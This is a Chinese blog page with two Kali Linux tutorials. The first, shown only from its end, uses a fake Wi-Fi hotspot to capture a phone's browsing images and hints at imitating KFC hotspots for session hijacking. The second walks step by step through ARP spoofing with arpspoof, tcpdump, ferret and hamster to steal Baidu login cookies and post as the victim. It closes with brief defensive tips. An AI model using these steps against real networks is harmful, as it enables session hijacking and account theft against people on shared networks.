<p><img src="http://images.cnitblog.com/blog/671902/201501/021935161229360.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021935253561039.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021935329503719.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021935449192896.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021935568416087.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021936083251879.png" alt=""></p>
<p><strong>　　　　显示热点链接信息</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021936204505541.png" alt=""></p>
<p><strong>　　　　手机链接假冒热点（Fake-Anka）</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021936552785800.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021937520911745.png" alt=""></p>
<p><strong>　手机浏览网页截图</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021938143257184.png" alt=""></p>
<p><strong>　电脑端通过driftnet程序截获的图片</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021939201539106.png" alt=""></p>
<p>　　　　上面仅仅是截了张图片验证成功</p>
<p>　　　　当然你可以在ettercap抓获Cookie信息进行会话劫持</p>
<p>　　　　然后你懂得…..</p>
<p>　　　　鉴于KFC，MDL等等 WIFI 一大堆，可行性还是很高的</p>
<p>　　　　可以去想一下，如果假冒的热点名和KFC原先的热点名相同，结果会怎么样 : )</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WIFI热点伪造/">WIFI热点伪造</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kali/">kali</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
    <article id="post-arpspoof" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2015/01/02/arpspoof/" class="article-date">
  	<time datetime="2015-01-02T08:42:41.000Z" itemprop="datePublished">2015-01-02</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2015/01/02/arpspoof/">内网 ARP 欺骗劫持 Cookie 登入百度</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x-00-ARP欺骗说明"><a href="#0x-00-ARP欺骗说明" class="headerlink" title="0x 00 ARP欺骗说明"></a>0x 00 ARP欺骗说明</h2><p>欺骗原理相关内容就不多叙述了，Google一大堆</p>
<p>实施ARP欺骗在 Windows 下， Linux 下都相关工具</p>
<p>由于在 Linux 下可以开启 ip_forward 功能，个人认为 Linux 下的工具作用效果比较好，本次测试是在Kali（Linux）中进行</p>
<h2 id="0x-01-攻击测试"><a href="#0x-01-攻击测试" class="headerlink" title="0x 01 攻击测试"></a>0x 01 攻击测试</h2><p><strong>1、 攻击拓扑</strong></p>
<p>　　　　攻击机：Kali Linux    IP：192.168.1.109</p>
<p>　　　　受害机：Win 7 64位　　IP：192.168.1.106</p>
<p>　　　　网关IP： 192.168.1.1</p>
<p>　　　　攻击工具：arpspoof，tcpdump，hamster，ferret</p>
<p>　　　　前三款工具已经集成在Kali中，ferret需要手动安装</p>
<p><strong>2、 安装ferret</strong></p>
<p>(1) 修改正确的软件安装源<br>(2) 添加Kali对32位应用程序的支持</p>
<pre><code>dpkg --add-architecture i386
</code></pre><p>(3) 更新安装源</p>
<pre><code>apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -y
</code></pre><p>(4) 安装ferret</p>
<pre><code>aptitude install ferret-sidejack:i386
</code></pre><p><strong>3、 打开路由转发（临时生效）</strong></p>
<pre><code>echo &quot;1&quot; &gt; /proc/sys/net/ipv4/ip_forward　　
</code></pre><p><strong>4、 开始 ARP 欺骗</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021846569813530.png" alt=""></p>
<p><strong>5、 新开一个Shell，抓取通过eth0接口的输出cookie.cap文件</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021849080915177.png" alt=""></p>
<p><strong>6、 受害机使用浏览器模拟百度账号登陆过程，或刷新已经登录的页面</strong></p>
<p><strong>7、 结束第4，第5步打开的进程</strong></p>
<p><strong>8、 使用ferret处理抓到包cookie.cap</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021853019349701.png" alt=""></p>
<p><strong>9、 架设hamster代理服务器</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021853380596231.png" alt=""></p>
<p><strong>10、 浏览器设置代理后，重启浏览器访问127.0.0.1:1234</strong></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021854197311801.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021855181067000.png" alt=""></p>
<p>　　在上面可以看到截取的Cookie信息，打开链接就可以了</p>
<p>　　PS：就不打码了，  大虾手下留情 - -。</p>
<p><strong>11、 测试攻击效果</strong></p>
<p>进贴吧发留言测试一下 ~~</p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021858075136845.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog/671902/201501/021858173252882.png" alt=""></p>
<p><strong>Summary：</strong></p>
<p>　　　　这种局域网ARP劫持是因为ARP协议设计缺陷被动更新ARP缓存表造成，不是很好防范</p>
<p>　　　　可以在路由器里静态绑定ARP条目减少避免危害</p>
<p>　　　　如果目标网站的安全性做的很好，劫持后拿到的Cookie也很难成功利用</p>
<p>　　　　安全是多方的，服务提供方和使用者都应该做出安全措施</p>
<p>　　　　最重要的是 见到匿名热点神马的不要随随便便就连上啊</p>
<p>　　　　很可能下一个小白鼠就是你…..　　　</p>
<p>　　　</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Cookie劫持/">Cookie劫持</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Kali/">Kali</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/内网渗透/">内网渗透</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>







  
  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
    	<div class="footer-left">
    		&copy; 2016 Anka9080
    	</div>
      	<div class="footer-right">

          
Analyse with <script src="http://s23.cnzz.com/z_stat.php?id=1259317280&web_id=1259317280" language="JavaScript"></script>

      	</div>
    </div>
  </div>
</footer>

    </div>
    
  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">


<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: true,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>
<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
<script src="/js/main.js"></script>






<script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  </div>
</body>
</html>